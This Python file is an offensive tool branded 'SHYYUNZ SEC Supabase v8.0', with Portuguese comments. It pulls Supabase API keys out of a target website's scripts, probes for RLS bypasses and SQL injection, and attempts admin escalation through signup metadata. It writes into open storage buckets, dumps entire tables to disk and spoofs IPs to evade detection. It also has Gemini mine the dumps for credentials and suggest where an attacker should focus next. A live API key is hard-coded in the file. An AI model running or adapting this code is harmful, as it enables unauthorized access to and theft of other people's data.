#!/usr/bin/env python3
import asyncio
import httpx
import json
import re
import time
import base64
from google import genai
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.live import Live
from rich.align import Align
from rich.syntax import Syntax
import os
import random
import string
import sys
from typing import List, Optional, Set, Dict
from urllib.parse import urljoin
import warnings
warnings.filterwarnings("ignore")


# --- CONFIGURAÇÃO VISUAL SHYYUNZ SEC ---
console = Console()

BANNER = """
[bold cyan]
 ██████╗██╗  ██╗██╗   ██╗██╗   ██╗███╗   ██╗███████╗
██╔════╝██║  ██║╚██╗ ██╔╝╚██╗ ██╔╝████╗  ██║╚══███╔╝
╚█████╗ ███████║ ╚████╔╝  ╚████╔╝ ██╔██╗ ██║  ███╔╝ 
 ╚═══██╗██╔══██║  ╚██╔╝    ╚██╔╝  ██║╚██╗██║ ███╔╝  
██████╔╝██║  ██║   ██║      ██║   ██║ ╚████║███████╗
╚═════╝ ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═══╝╚══════╝
[/bold cyan][bold magenta] ╔═════════════════════════════════════════════════════╗
 ║ [bold white]SHYYUNZ SEC - SUPABASE v8.0[/bold white]       ║
 ║ [dim]Shadow Ops & AI Exploit Edition[/dim]     ║
 ╚═════════════════════════════════════════════════════╝[/bold magenta]
"""

BRANDED_BANNER = r"""
[bold cyan]
                  ___====-_  _-====___
            _--^^^#####//      \\#####^^^--_
         _-^##########// (    ) \\##########^-_
        -############//  |\^^/|  \\############-
      _/############//   (@::@)   \\############\_
     /#############((     \\//     ))#############\
    -###############\\    (oo)    //###############-
   -#################\\  / VV \  //#################-
  -###################\\/      \//###################-
 _#/|##########/\######(   /\   )######/\##########|\#_
 |/ |#/\#/\#/\/  \#/\##\  |  |  /#/\#/  \/\#/\#/\#| \|
 `  |/  V  V  `   V  \# \ |  | / #/  V   '  V  V  \|  '
     `   `  `      `   /  \_|  |_/  \   '      '  '   '
                     /            \\
                    |   [bold white]SHYYUNZ SEC[/bold white]   |
                     \____________/
[/bold cyan]
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
]

class KnowledgeManager:
    """Sistema de Aprendizado: Memoriza tabelas e alvos descobertos."""
    def __init__(self, filename="sh_knowledge.json"):
        self.filename = filename
        self.data = self.load()

    def load(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, "r") as f: return json.load(f)
            except: pass
        return {"tables": [], "rpcs": [], "buckets": []}

    def save(self):
        try:
            with open(self.filename, "w") as f: json.dump(self.data, f, indent=2)
        except: pass

    def learn(self, category: str, name: str):
        if name not in self.data[category]:
            self.data[category].append(name)
            self.save()

knowledge = KnowledgeManager()

class ShyyunzBrain:
    """Cérebro Analítico: Usa Gemini para minerar dados sensíveis em Dumps."""
    def __init__(self, api_key: str):
        self.client = genai.Client(api_key=api_key)

    async def analyze_data(self, table_name: str, data: List[Dict]):
        if not data: return "Nenhum dado para analisar."
        sample = json.dumps(data[:10], indent=2)
        prompt = f"""
        Você é o Cérebro Analítico da SHYYUNZ SEC. Analise o seguinte DUMP da tabela '{table_name}'.
        Identifique:
        1. Dados Sensíveis (Senhas, Hashes, Tokens, E-mails de Admins, IDs de transação).
        2. Nível de Impacto (Baixo, Médio, Crítico).
        3. Recomendações de Exploração (onde um atacante focaria agora?).
        
        Responda em PORTUGUÊS BRASIL de forma técnica e direta.
        
        DADOS:
        {sample}
        """
        try:
            response = self.client.models.generate_content(model='gemini-1.5-flash', contents=prompt)
            return response.text
        except Exception as e:
            return f"[red][!] Erro no Cérebro Analítico: {e}[/red]"

    async def suggest_filters(self, table_name: str) -> List[str]:
        prompt = f"Como auditor de segurança, sugira 3 filtros PostgREST (ex: id=not.eq.0) para tentar burlar RLS na tabela '{table_name}'. Responda APENAS os filtros separados por vírgula."
        try:
            res = self.client.models.generate_content(model='gemini-1.5-flash', contents=prompt)
            return [f.strip() for f in res.text.split(",") if "=" in f]
        except: return ["id=not.eq.0", "limit=1"]

class ShyyunzAuditor:
    def __init__(self, target: str, apikey: str, bearer: Optional[str] = None):
        self.project_ref = self.extract_project_ref(target)
        self.root_url = f"https://{self.project_ref}.supabase.co"
        self.base_url = f"{self.root_url}/rest/v1/"
        self.auth_url = f"{self.root_url}/auth/v1/"
        self.storage_url = f"{self.root_url}/storage/v1/"
        self.apikey = apikey.strip()
        self.bearer = bearer.strip() if bearer else self.apikey
        self.headers = {"apikey": self.apikey, "Authorization": f"Bearer {self.bearer}", "Content-Type": "application/json"}
        self.results = []
        self.graphql_discovered = set()
        self.auth_settings = {}
        self.semaphore = asyncio.Semaphore(60)
        self.tested_count = 0
        self.hits_count = 0
        self.is_service_role = False
        self.req_count = 0
        self.proxies = self.load_proxies()
        self.current_proxy = None

    def load_proxies(self):
        if os.path.exists("sh_proxies.txt"):
            try:
                with open("sh_proxies.txt", "r") as f:
                    p = [l.strip() for l in f if l.strip()]
                    if p: console.print(f"[bold cyan][*] {len(p)} Proxies carregados de sh_proxies.txt[/bold cyan]")
                    return p
            except: pass
        return []

    def rotate_headers(self):
        self.req_count += 1
        if self.req_count % 50 == 0:
            new_ua = random.choice(USER_AGENTS)
            fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
            self.headers.update({"User-Agent": new_ua, "X-Forwarded-For": fake_ip, "X-Real-IP": fake_ip})
            if self.proxies: self.current_proxy = random.choice(self.proxies)

    async def check_service_role(self):
        async with httpx.AsyncClient() as client:
            try:
                resp = await client.get(f"{self.auth_url}admin/users", headers=self.headers, timeout=5.0)
                if resp.status_code == 200:
                    self.is_service_role = True
                    console.print("[bold red blink][!!!] ALERTA CRÍTICO: Chave SERVICE_ROLE Detectada! [!!!][/bold red blink]")
            except: pass

    @staticmethod
    def extract_project_ref(target: str) -> str:
        clean = target.strip().lower()
        if "supabase.co" in clean:
            matches = re.findall(r"https?://([a-z0-9-]+)\.supabase\.co", clean)
            if matches: return matches[0]
        matches = re.findall(r"([a-z0-9]{20})", clean)
        return matches[0] if matches else clean.replace("https://", "").replace("http://", "").split(".")[0]

    async def pre_scan_auth_check(self) -> bool:
        fake_target = "shyyunz_heuristic_check"
        async with httpx.AsyncClient(timeout=10.0) as client:
            try:
                resp = await client.get(f"{self.base_url}{fake_target}?select=*", headers=self.headers)
                if resp.status_code == 401: console.print("[bold red][!] ERRO: Autenticação Rejeitada (401).[/bold red]"); return False
                return True
            except: return False

    async def perform_intelligence_gathering(self):
        console.print("\n[bold yellow]>>> COLETA DE INFORMAÇÕES E EXPLORAÇÃO <<<[/bold yellow]")
        try:
            async with httpx.AsyncClient() as client:
                aresp = await client.get(f"{self.auth_url}settings", headers={"apikey": self.apikey}, timeout=10.0)
                if aresp.status_code == 200:
                    if not aresp.json().get("disable_signup", True): console.print("  [bold red][!] VULN: Sign-Up Aberto![/bold red]")
        except: pass
        try:
            gql_url = f"{self.root_url}/graphql/v1"
            async with httpx.AsyncClient() as client:
                gresp = await client.post(gql_url, headers=self.headers, json={"query": "{ __schema { types { name } } }"}, timeout=10.0)
                if gresp.status_code == 200:
                    extracted = [t.get("name").lower() for t in gresp.json()["data"]["__schema"]["types"] if not t.get("name").startswith("__")]
                    if extracted:
                        console.print(f"  [bold green][+] EXPLORAÇÃO GQL: Vazou {len(extracted)} alvos![/bold green]")
                        for e in extracted: knowledge.learn("tables", e); self.graphql_discovered.add(e)
        except: pass

    async def web_recon(self, site_url: str):
        paths = [".env", "js/config.js", "supabase.js"]
        async with httpx.AsyncClient(timeout=5.0, follow_redirects=True, verify=False) as client:
            for p in paths:
                try:
                    res = await client.get(urljoin(site_url, p))
                    if res.status_code == 200 and "supabase" in res.text.lower():
                        console.print(f"[bold red][!] VAZAMENTO SITE: {urljoin(site_url, p)}[/bold red]")
                except: pass

    def analyze_jwt(self, token: str):
        try:
            parts = token.split(".")
            if len(parts) >= 2:
                payload = json.loads(base64.b64decode(parts[1] + "==").decode("utf-8"))
                console.print(f"\n[bold magenta]--- TOKEN JWT ---[/bold magenta]\n[*] Role: {payload.get('role')}\n[*] Metadata: {json.dumps(payload.get('app_metadata'))}")
        except: pass

    async def exploit_signup(self, brain: Optional[ShyyunzBrain] = None):
        email = f"shy.{random.randint(100, 999)}@gmail.com"
        password = "Shy_" + "".join(random.choices(string.ascii_letters + string.digits, k=10))
        async with httpx.AsyncClient() as client:
            try:
                resp = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey}, json={"email": email, "password": password, "data": {"role": "admin"}})
                if resp.status_code in [200, 201]:
                    token = resp.json().get('access_token')
                    if token: return token
            except: pass
        return None

    async def deep_bucket_scan(self):
        common_buckets = ["avatars", "backups", "configs", "media", "public", "profiles", "documents"]
        console.print("\n[bold cyan][*] Iniciando Deep Bucket Scan...[/bold cyan]")
        async with httpx.AsyncClient(headers=self.headers) as client:
            for b_name in common_buckets:
                res_l = await client.get(f"{self.storage_url}bucket/{b_name}")
                if res_l.status_code == 200: console.print(f"[bold red][!] BUCKET ABERTO: {b_name}[/bold red]")
                res_u = await client.post(f"{self.storage_url}object/{b_name}/sh_test.txt", files={"file": ("sh_test.txt", b"VULN")})
                if res_u.status_code in [200, 201]: console.print(f"[bold red][!!!] BUCKET ESCRITA: {b_name}[/bold red]")
                
    async def rpc_sniper(self, brain: Optional[ShyyunzBrain] = None):
        common_rpcs = ["get_users", "admin_stats", "get_config", "get_secrets"]
        console.print("\n[bold magenta][*] Iniciando RPC Sniper...[/bold magenta]")
        async with httpx.AsyncClient(headers=self.headers) as client:
            for rpc in common_rpcs:
                res = await client.post(f"{self.root_url}/rest/v1/rpc/{rpc}", json={})
                if res.status_code in [200, 204]:
                    console.print(f"[bold red][!] RPC ENCONTRADO: {rpc}[/bold red]")
                    if brain: console.print(Panel(await brain.analyze_data(f"RPC_{rpc}", res.json() if res.status_code == 200 else []), title=f"Analise RPC: {rpc}"))
                    for i_p in [{"query": "SELECT version()"}, {"sql": "SELECT datname FROM pg_database"}]:
                        i_r = await client.post(f"{self.root_url}/rest/v1/rpc/{rpc}", json=i_p)
                        if i_r.status_code == 200 and ("PostgreSQL" in i_r.text or "datname" in i_r.text):
                            console.print(f"[bold red blink][!!!] SQL INJECTION DETECTADO: {rpc}[/bold red blink]")

    async def exploit_escalation(self):
        payloads = [{"role": "admin"}, {"is_admin": True}, {"app_metadata": {"role": "admin"}}, {"user_metadata": {"role": "admin"}}, {"claims": {"role": "admin"}}]
        for p in payloads:
            email = f"shy.burn.{random.randint(100, 999)}@shyyunz.sec"
            async with httpx.AsyncClient() as client:
                try:
                    resp = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey}, json={"email": email, "password": "Shy_Admin_123", "data": p})
                    if resp.status_code in [200, 201]:
                        token = resp.json().get('access_token')
                        if token:
                            console.print(f"[bold green][+] Payload Sucesso: {json.dumps(p)}![/bold green]")
                            self.bearer = token; self.headers["Authorization"] = f"Bearer {token}"
                            return True
                except: continue
        return False

    async def mass_exfiltration(self):
        out_dir = f"sh_dump_{self.project_ref}"
        if not os.path.exists(out_dir): os.makedirs(out_dir)
        async with httpx.AsyncClient() as client:
            for r in self.results:
                if r.get('readable'):
                    try:
                        res = await client.get(f"{self.base_url}{r['name']}?select=*", headers=self.headers)
                        if res.status_code == 200:
                            f_path = os.path.join(out_dir, f"{r['name']}.json")
                            with open(f_path, "w") as f: f.write(json.dumps(res.json()))
                            console.print(f" [bold green][+] SUGADO:[/bold green] {r['name']}")
                    except: pass

    async def check_target(self, client: httpx.AsyncClient, target: str, t_type: str, progress, task_id, brain: Optional[ShyyunzBrain] = None):
        async with self.semaphore:
            self.rotate_headers()
            url = f"{self.base_url}{target}" if t_type != "BUCKET" else f"{self.storage_url}bucket/{target}"
            try:
                readable, bypass_used = False, None
                if t_type == "TABLE": 
                    resp = await client.get(f"{url}?select=*", headers=self.headers, params={"limit": 1})
                    readable = (resp.status_code == 200)
                    if not readable:
                        res_j = await client.get(f"{url}?select=*,auth.users(*)", headers=self.headers, params={"limit": 1})
                        if res_j.status_code == 200: readable = True; bypass_used = "JOIN Injection"
                        if not readable and brain:
                            filters = await brain.suggest_filters(target)
                            for f in filters:
                                res_f = await client.get(f"{url}?{f}", headers=self.headers)
                                if res_f.status_code == 200: readable = True; bypass_used = f"AI Bypass ({f})"; break
                elif t_type == "RPC": 
                    resp = await client.post(url, headers=self.headers, json={})
                    readable = (resp.status_code in [200, 204, 400])
                else: 
                    resp = await client.get(url, headers=self.headers)
                    readable = (resp.status_code == 200)

                if readable:
                    self.hits_count += 1
                    self.results.append({"type": t_type, "name": target, "readable": True, "bypass": bypass_used})
                self.tested_count += 1
                progress.update(task_id, description=f"[bold red]Auditoria V8.0: [ACERTOS {self.hits_count}] ")
            except: pass
            finally: progress.advance(task_id)

    async def run_scan(self, tables: List[str], rpcs: List[str], buckets: List[str], brain: Optional[ShyyunzBrain] = None):
        async with httpx.AsyncClient(verify=False, http2=True) as client:
            total = len(tables) + len(rpcs) + len(buckets)
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), console=console) as progress:
                task = progress.add_task("[bold red]Shadow Operations active...", total=total)
                await asyncio.gather(*[self.check_target(client, t, "TABLE", progress, task, brain) for t in tables], *[self.check_target(client, r, "RPC", progress, task, brain) for r in rpcs], *[self.check_target(client, b, "BUCKET", progress, task, brain) for b in buckets])

async def fetch_supabase_details(url: str):
    if not url.startswith("http"): url = "https://" + url
    async with httpx.AsyncClient(headers={'User-Agent': 'Mozilla/5.0'}, timeout=15.0, follow_redirects=True, verify=False) as client:
        try:
            console.print(f"[dim][*] Analisando: {url}...[/dim]")
            res = await client.get(url)
            html = res.text
            scripts = re.findall(r'<script.*?src=["\'](.*?\.js.*?)["\']', html)
            common_paths = ["js/config.js", "js/supabase.js", "js/main.js", "config.js"]
            js_urls = [urljoin(url, s) for s in scripts] + [urljoin(url, p) for p in common_paths]
            url_pattern = r'https://[a-z0-9\-]+\.supabase\.(co|net)'
            key_pattern = r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9.\-_]{50,}|sb_publishable_[a-zA-Z0-9\-_]{20,}|pk_[a-zA-Z0-9\-_]{20,})'
            target, apikey = None, None
            m_u = re.search(url_pattern, html); m_k = re.search(key_pattern, html)
            if m_u: target = m_u.group(0)
            if m_k: apikey = m_k.group(0)
            if not target or not apikey:
                for j_url in list(set(js_urls)):
                    try:
                        j_res = await client.get(j_url, timeout=5.0)
                        if j_res.status_code == 200:
                            if not target: m_u = re.search(url_pattern, j_res.text); target = m_u.group(0) if m_u else None
                            if not apikey: m_k = re.search(key_pattern, j_res.text); apikey = m_k.group(0) if m_k else None
                            if target and apikey: break
                    except: continue
            if target and apikey: console.print(f"[bold green][+] Supabase detectado: {target}[/bold green]"); return target, apikey
            return None, None
        except: return None, None

async def audit_routine():
    console.print(Align.center(BRANDED_BANNER))
    console.print(Align.center(Panel.fit("[bold magenta]SUPABASE AUDITOR PRO[/bold magenta]", border_style="cyan")))
    site_url = console.input("\n[bold cyan][🌐 SHY_SEC][/bold cyan] URL do Site Alvo: ").strip()
    if site_url.lower() in ["exit", "sair", "0"]: return False
    target, apikey = await fetch_supabase_details(site_url)
    ai_key = "AIzaSyDTyiNk3xvtuNVETIve2UoI1D6VWj605K0"
    brain = ShyyunzBrain(ai_key)
    if not target or not apikey:
        target = console.input("[bold cyan][🌐 SHY_SEC][/bold cyan] Informe URL: ").strip(); apikey = console.input("[bold cyan][🔑 SHY_SEC][/bold cyan] Informe Key: ").strip()
        if not target or not apikey: return True
    auditor = ShyyunzAuditor(target, apikey)
    await auditor.web_recon(site_url); await auditor.check_service_role()
    if not await auditor.pre_scan_auth_check(): return True
    await auditor.perform_intelligence_gathering()
    tables = list(set(["users", "profiles", "accounts", "admins", "settings", "orders"] + knowledge.data["tables"]))
    await auditor.run_scan(tables, ["get_users", "get_config"], ["avatars", "public"], brain)
    table_map = {}
    summary = Table(title="[bold red]VETORES ENCONTRADOS (Shadow Ops)[/bold red]")
    summary.add_column("Nr."); summary.add_column("Alvo"); summary.add_column("Status")
    for idx, r in enumerate(auditor.results, 1):
        status = "[bold green]EXPOSTO[/bold green]" + (f" ({r['bypass']})" if r.get('bypass') else "") if r.get('readable') else "[dim]RLS[/dim]"
        summary.add_row(str(idx), r['name'], status); table_map[str(idx)] = r
    console.print(summary)
    while True:
        console.print("\n[bold cyan][1] Dump [B] Deep Bucket [R] RPC Sniper [D] Mass Exfil [E] Escalation [0] Voltar[/bold cyan]")
        c = input("\n[S_SEC] Comando: ").strip().upper()
        if c == "0": return True
        elif c == "E" and await auditor.exploit_escalation(): console.print("[bold green][*] Escalonamento SUCESSO![/bold green]")
        elif c == "1":
            idx = input("Nr. Alvo: ").strip()
            if idx in table_map:
                res = await httpx.AsyncClient().get(f"{auditor.base_url}{table_map[idx]['name']}?select=*", headers=auditor.headers, params={"limit":10})
                console.print(Panel(json.dumps(res.json(), indent=2), title=f"Dump: {table_map[idx]['name']}"))
                if brain and input("Analise IA? (S/N): ").upper() == "S": console.print(Panel(await brain.analyze_data(table_map[idx]['name'], res.json()), border_style="magenta"))
        elif c == "R": await auditor.rpc_sniper(brain)
        elif c == "B": await auditor.deep_bucket_scan()
        elif c == "D": await auditor.mass_exfiltration()

async def main():
    while True:
        if not await audit_routine(): break

if __name__ == "__main__":
    asyncio.run(main())
